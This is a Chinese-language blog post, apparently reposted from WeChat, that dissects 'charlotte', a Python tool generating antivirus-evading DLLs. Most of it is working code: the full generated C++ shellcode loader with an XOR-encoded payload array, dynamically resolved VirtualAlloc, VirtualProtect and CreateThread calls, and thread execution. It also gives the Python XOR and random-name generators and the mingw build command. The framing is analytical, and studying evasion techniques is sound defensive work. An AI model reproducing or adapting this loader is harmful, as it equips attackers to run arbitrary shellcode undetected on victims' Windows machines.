> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Cm5EuxgmWkKmmCeb3zyBYA)

**前言**

 **多看看别人的工具，自己也就会写了。（手动狗头）**

charlotte 是一款 Python 编写的自动化免杀工具，用来生成免杀的 dll 文件，在 antiscan.me 上为全绿，效果可见一斑。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VcSwzRNFWkmicyTppCaLpm76ucTC3cdjLDAozkgvoaiaL4pPcas6iaS3lToUVF1icASvMIFsoHMibpXVQ/640?wx_fmt=png)

官方地址如下; https://github.com/9emin1/charlotte，其依赖 mingw-w64 环境，可使用下面的命令安装：

```
apt-get install mingw-w64*
```

利用动态导出以及 xor 编码实现了对杀软的绕过。其文件很简单，只有一个简单的 py 文件以及一个 cpp 文件，根据以后以往的经验来看，大概率是通过 py 操作 cpp，然后使用 mingw 去编译为 dll 文件。

找到移除代码并将其注释掉，这样可以方便我们进行分析。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VcSwzRNFWkmicyTppCaLpm72UouU4oWhOQnicib8hpcHfdZn96SrJVmAJyU9OKMsnSUI9AhhaPcJd7Q/640?wx_fmt=png)

此时运行程序，生成的 cpp 文件便可以拿来进行分析了。

```
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment (lib, "user32.lib")

unsigned char JCDlUYUy[] = { 0x8f, 0x31, 0xce, 0x82, 0x93, 0xa0, 0xa3, 0x66, 0x69, 0x6a, 0x32, 0x22, 0x38, 0x1d, 0x34, 0x32, 0x1e, 0x2b, 0x57, 0xbb, 0xf, 0x3b, 0xf8, 0x2b, 0x2d, 0x2e, 0xe8, 0x1a, 0x7b, 0x2e, 0xe2, 0x38, 0x53, 0x3b, 0xf2, 0x3f, 0x36, 0x2b, 0x47, 0xd4, 0x2c, 0x23, 0x27, 0x42, 0xba, 0x31, 0x7c, 0xa6, 0xcf, 0x74, 0x2, 0x1a, 0x6b, 0x46, 0x53, 0x32, 0xb8, 0x84, 0x6b, 0x22, 0x49, 0xa2, 0x84, 0x84, 0x38, 0x32, 0x22, 0x31, 0xc6, 0x34, 0x43, 0xc3, 0x21, 0x5a, 0x21, 0x6b, 0xa3, 0xf8, 0xf9, 0xc5, 0x66, 0x63, 0x48, 0x2b, 0xe3, 0xa9, 0x1e, 0x14, 0x3b, 0x78, 0x9d, 0x36, 0xe8, 0x0, 0x7b, 0x22, 0xe2, 0x2a, 0x53, 0x3a, 0x78, 0x9d, 0x85, 0x35, 0x0, 0x9c, 0xaf, 0x28, 0xe1, 0x47, 0xfb, 0x31, 0x4c, 0xb0, 0x2e, 0x79, 0xaa, 0x2e, 0x58, 0xaa, 0xdf, 0x32, 0xb8, 0x84, 0x6b, 0x22, 0x49, 0xa2, 0x5e, 0x89, 0x1f, 0x82, 0x3f, 0x7a, 0x1, 0x42, 0x6b, 0xd, 0x5a, 0xb7, 0x1c, 0xb2, 0x2b, 0x37, 0xf2, 0xd, 0x42, 0x2a, 0x49, 0xb3, 0x0, 0x28, 0xe1, 0x7f, 0x3b, 0x3d, 0xc6, 0x26, 0x7f, 0x1, 0x62, 0xb6, 0x28, 0xe1, 0x77, 0xfb, 0x31, 0x4c, 0xb6, 0x22, 0x10, 0x22, 0x3e, 0x37, 0x33, 0x29, 0x32, 0x21, 0xc, 0x3f, 0x22, 0x12, 0x2b, 0xe5, 0x85, 0x4a, 0x32, 0x21, 0x86, 0xad, 0x3e, 0x22, 0x11, 0x39, 0x2e, 0xe2, 0x78, 0x9a, 0x24, 0x86, 0xb2, 0x99, 0x3e, 0x0, 0xd9, 0x67, 0x69, 0x6a, 0x73, 0x73, 0x79, 0x4d, 0x66, 0x2b, 0xc5, 0xee, 0x67, 0x68, 0x6a, 0x73, 0x32, 0xc3, 0x7c, 0xed, 0xc, 0xcf, 0x9c, 0xb3, 0xd2, 0x9a, 0xc6, 0xd1, 0x2f, 0xc, 0xdc, 0xc5, 0xdd, 0xde, 0xfb, 0x96, 0xbf, 0x3b, 0xf0, 0xbd, 0x65, 0x5a, 0x65, 0x34, 0x69, 0xe6, 0x92, 0x8a, 0x6, 0x76, 0xc2, 0xa, 0x75, 0x11, 0x27, 0x9, 0x66, 0x30, 0x2b, 0xfa, 0xa9, 0x86, 0x98, 0x5, 0x2, 0x24, 0x0, 0x48, 0xc, 0x12, 0x16, 0x73 };
unsigned char eZoBiJrv[] = { 0x1d, 0x13, 0x8, 0x39, 0x27, 0x22, 0x6, 0x33, 0x2b, 0x29, 0x1f, 0x3b };
unsigned char flRsMjXxEqUg[] = { 0x7, 0x2e, 0x30, 0x37, 0x30, 0x35, 0xd, 0x3a, 0x30, 0x15, 0x13, 0x34, 0x24, 0x36 };
unsigned char UNvUUdosORtP[] = { 0x5, 0x22, 0x33, 0x4, 0x7, 0xd, 0x3d, 0x10, 0x25, 0x23, 0x31, 0x32 };
unsigned char ATBDYquVpQsA[] = { 0x3, 0x2b, 0x2, 0x24, 0x3e, 0x24, 0x1f, 0x3b, 0x2d, 0x1a, 0x2, 0x38, 0x2f, 0x24, 0x32, 0x12, 0x2e, 0xe, 0x1c };

unsigned int nRhWSUlMCH = sizeof(JCDlUYUy);
unsigned int QWcvhCDTV = sizeof(eZoBiJrv);
unsigned int EmlCIxyIVtZMB = sizeof(flRsMjXxEqUg);
unsigned int KrStpnMvdV = sizeof(UNvUUdosORtP);
unsigned int vpbJEJvZMwA = sizeof(ATBDYquVpQsA);

char OyFWAUEjbtSFRHn[] = "syMfcHcfijs";
char lnqWuuargPhxKMP[] = "KzzMRCjrGEpXt";
char ecNUArKcaf[] = "QGBCETajBzg";
char vsAmIjjJogRteUG[] = "FPVeshixW";
char BoQhJpMzQmTDnGO[] = "TJkPxKmhDte";

LPVOID (WINAPI * xUgwJldYot)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
BOOL (WINAPI * OVpMScQZe)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
HANDLE (WINAPI * GDqHQLdymeGF)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
DWORD (WINAPI * AMFrDPRFDB)(HANDLE hHandle, DWORD dwMilliseconds);

void bZmKQfetGTGMibw(char * data, size_t data_len, char * key, size_t key_len) {
        int j;
        
        j = 0;
        for (int i = 0; i < data_len; i++) {
                if (j == key_len - 1) j = 0;

                data[i] = data[i] ^ key[j];
                j++;
        }
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

extern "C" {
__declspec(dllexport) BOOL WINAPI EUywcFyggt(void) {
  
  void * Lotjdjcv;
  BOOL icOQGcPfg;
  HANDLE PXGxcviMnUbGp;
      DWORD RqwSapwJJnUpb = 0;

        bZmKQfetGTGMibw((char *) eZoBiJrv, QWcvhCDTV, lnqWuuargPhxKMP, sizeof(lnqWuuargPhxKMP));

  xUgwJldYot = GetProcAddress(GetModuleHandle("kernel32.dll"), eZoBiJrv);
  Lotjdjcv = xUgwJldYot(0, nRhWSUlMCH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  
  bZmKQfetGTGMibw((char *) JCDlUYUy, nRhWSUlMCH, OyFWAUEjbtSFRHn, sizeof(OyFWAUEjbtSFRHn));
  
  RtlMoveMemory(Lotjdjcv, JCDlUYUy, nRhWSUlMCH);
  
        bZmKQfetGTGMibw((char *) flRsMjXxEqUg, EmlCIxyIVtZMB, ecNUArKcaf, sizeof(ecNUArKcaf));

  OVpMScQZe = GetProcAddress(GetModuleHandle("kernel32.dll"), flRsMjXxEqUg);
  icOQGcPfg = OVpMScQZe(Lotjdjcv, nRhWSUlMCH, PAGE_EXECUTE_READ, &RqwSapwJJnUpb);

  // If all good, launch the payload
  if ( icOQGcPfg != 0 ) {
            bZmKQfetGTGMibw((char *) UNvUUdosORtP, KrStpnMvdV, vsAmIjjJogRteUG, sizeof(vsAmIjjJogRteUG));
            GDqHQLdymeGF = GetProcAddress(GetModuleHandle("kernel32.dll"), UNvUUdosORtP);
      PXGxcviMnUbGp = GDqHQLdymeGF(0, 0, (LPTHREAD_START_ROUTINE) Lotjdjcv, 0, 0, 0);
            bZmKQfetGTGMibw((char *) ATBDYquVpQsA, vpbJEJvZMwA, BoQhJpMzQmTDnGO, sizeof(BoQhJpMzQmTDnGO));
      AMFrDPRFDB = GetProcAddress(GetModuleHandle("kernel32.dll"), ATBDYquVpQsA);
      AMFrDPRFDB(PXGxcviMnUbGp, -1);
  }
  return TRUE;
  }
}
```

其中的 calc_payload[] 为我们的 shellcode，后面的则是随机生成的 key 和函数名，然后使用动态导出的方法来获取函数，原代码如下：

```
BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
XOR((char *) virtual_protect, vp_len, vp_key, sizeof(vp_key));

  pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), virtual_protect);
  rvba = pVirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);
```

而这些实现，则是用的 py 实现，获取随机字符串

```
def get_random_string():
    # With combination of lower and upper case
    length = random.randint(8, 15)
    result_str = ''.join(random.choice(string.ascii_letters) for i in range(length))
    # print random string
    return result_str
```

xor 函数

```
def xor(data):
    
    key = get_random_string()
    l = len(key)
    output_str = ""

    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        o = lambda x: x if isinstance(x, int) else ord(x) # handle data being bytes not string
        output_str += chr(o(current) ^ ord(current_key))

    ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in output_str) + ' };'
    return ciphertext, key
```

剩下的就是一个替换了，最后使用 ming-w 去编译 dll

```
os.system("x86_64-w64-mingw32-g++ -shared -o charlotte.dll charlotte.cpp -fpermissive >/dev/null 2>&1")
```

**总结：工具技术均为常见技术，结合起来则出了不错的效果，当然 dll 的选择也是一个很好的点，参考之前生成 service exe 的工具。**

     ▼

更多精彩推荐，请关注我们

▼

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XZjHeWkA6jN4ScHYyWRlpHPPgib1gYwMYGnDWRCQLbibiabBTc7Nch96m7jwN4PO4178phshVicWjiaeA/640?wx_fmt=png)